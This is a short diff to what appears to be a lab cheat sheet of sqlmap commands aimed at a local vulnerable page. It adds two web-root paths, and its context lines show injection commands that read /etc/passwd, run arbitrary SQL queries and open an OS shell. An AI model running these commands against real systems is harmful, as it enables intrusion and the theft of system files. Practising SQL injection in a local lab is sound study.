@@ -11,6 +11,10 @@ python sqlmap.py -u "http://localhost/weak.php?id=10" --current-user --is-dba --
 </br>
 python sqlmap.py -u "http://localhost/weak.php?id=10" --file-read=/etc/passwd --threads=10
 </br>
+C:\xampp\htdocs
+</br>
+/var/www/html/
+</br>
 python sqlmap.py -u "http://localhost/weak.php?id=10" --sql-query="select now();"
 </br>
 python sqlmap.py -u "http://localhost/weak.php?id=10" --os-shell
